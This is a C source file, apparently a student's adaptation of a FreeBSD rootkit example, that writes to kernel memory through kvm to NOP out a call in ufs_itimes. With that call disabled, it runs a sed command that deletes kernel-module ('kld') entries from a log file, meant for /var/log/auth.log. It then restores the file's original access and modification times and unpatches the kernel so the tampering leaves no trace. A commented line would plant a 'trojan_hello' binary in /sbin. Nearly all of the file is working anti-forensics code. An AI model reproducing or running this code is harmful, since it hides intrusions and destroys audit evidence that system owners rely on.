/*-
 * Copyright (c) 2007 Joseph Kong.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the author nor the names of any co-contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Objectives in this file (will add comment sbelow to indicate what each part does)
 * 
 * - Allocate kernel memory to save the current stae of ufs_itime in kernel mem
 * - Save the access and mod times of target file/dir prior to our operations
 * - Byte patch (NOP out certain parts) the ufs_itime() in kernel 
 * -  ===> DO ROOTKIT STUFF <===
 * - Rollback access and mod time by overwriting new changes with the saved times
 * - Revert the patched ufs_itimes back to normal so that it appears nothing has changed 
 *
 *  [Assumes that the byte sequence is correct and matches the one given to us now]
 *  [If i have time I might implement a more flexible (less hardcoded) byte patching system]
 */

/*
 * Steps:
 * -> Get the actual replacing working first, dont worry about times
 * -> Get A and M rollback working
 * -> finally get byte patching working !  (on this specific version)
 * -> extra: expand to work for other versions // 
 */ 

#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

//#define SIZE		450
#define SIZE        112             //thats the size of ufs_itimes in our case 
#define T_NAME		"trojan_hello"
#define DESTINATION	"/sbin/."

#define TARGET      "/tmp/logtest"  //"/var/log/auth.log"
#define TARGET2     "/usr/bin/sed"

//sed -i '' '/kld/d' /var/log/auth.log
char cmd[] = "sed -i \'\' \'/kld/d\' " TARGET;

/* Replacement code. */
unsigned char nop_code[] =
    // According to the disassembly we need to NOP out 5 bytes of instructions
    // c0e2e25b: e8 40 00 00 00 call c0e2e2a0 <ufs_itimes_locked>
	"\x90\x90\x90\x90\x90";		/* nop		*/

int
main(int argc, char *argv[])
{
	int i, offset1;
	char errbuf[_POSIX2_LINE_MAX];
	kvm_t *kd;
	struct nlist nl[] = { {NULL}, {NULL}, };
	unsigned char ufs_itimes_code[SIZE];

	struct stat sb;
	struct timeval time[2];

	/* Initialize kernel virtual memory access. */
	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
	if (kd == NULL) {
		fprintf(stderr, "KVM INIT ERROR: %s\n", errbuf);
		exit(-1);
	}

	nl[0].n_name = "ufs_itimes";

	if (kvm_nlist(kd, nl) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value) {
		fprintf(stderr, "ERROR: Symbol %s not found\n",
		    nl[0].n_name);
		exit(-1);
	}

	/* Save a copy of ufs_itimes. */
	if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
		fprintf(stderr, "SAVE ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

    /* Search through ufs_itimes for the instructions:
     * c0e2e25b: e8 40 00 00 00 call c0e2e2a0 <ufs_itimes_locked>
     */
	for (i = 0; i < SIZE - 2; i++) {
		if (ufs_itimes_code[i] == 0xe8 &&
		    ufs_itimes_code[i+1] == 0x40 &&
		    ufs_itimes_code[i+2] == 0x00 &&
            ufs_itimes_code[i+3] == 0x00)
			offset1 = i;
	}

	/* Save TARGET's access and modification times. */
	if (stat(TARGET, &sb) < 0) {
		fprintf(stderr, "STAT ERROR: %d\n", errno);
		exit(-1);
	}

	time[0].tv_sec = sb.st_atime;
	time[1].tv_sec = sb.st_mtime;

	/* Patch ufs_itimes. */
	if (kvm_write(kd, nl[0].n_value + offset1, nop_code,
	    sizeof(nop_code) - 1) < 0) {
		fprintf(stderr, "PATCH ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

    /* === DO ROOTKIT STUFF === */

	/* Copy T_NAME into DESTINATION. */
	//char string[] = "cp" " " T_NAME " " DESTINATION;
	system(cmd);

    /* === FINISH ROOTKIT STUFF === */

	/* Roll back TARGET's access and modification times. */
	if (utimes(TARGET, (struct timeval *)&time) < 0) {
		fprintf(stderr, "UTIMES ERROR: %d\n", errno);
		exit(-1);
	}

	/* Restore ufs_itimes. */
	if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
	    sizeof(nop_code) - 1) < 0) {
		fprintf(stderr, "RESTORE ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Close kd. */
	if (kvm_close(kd) < 0) {
		fprintf(stderr, "CLOSE ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Print out a debug message, indicating our success. */
	printf("::::: Successfully completed :::::\n");

	exit(0);
}
